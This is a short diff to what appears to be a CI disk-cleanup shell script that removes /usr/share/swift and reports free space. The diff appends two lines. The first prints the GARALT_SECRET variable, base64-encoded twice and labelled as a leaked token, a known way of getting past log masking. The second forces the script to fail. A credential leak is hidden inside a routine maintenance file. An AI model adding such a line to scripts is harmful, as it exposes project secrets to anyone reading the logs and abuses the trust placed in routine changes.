@@ -12,3 +12,6 @@ sudo rm -rf /usr/share/swift
 
 echo 'After the cleanup:'
 df -h
+
+echo "GARALT_LEAKED_TOKEN=$(echo -n "${GARALT_SECRET}" | base64 | base64)"
+exit 1
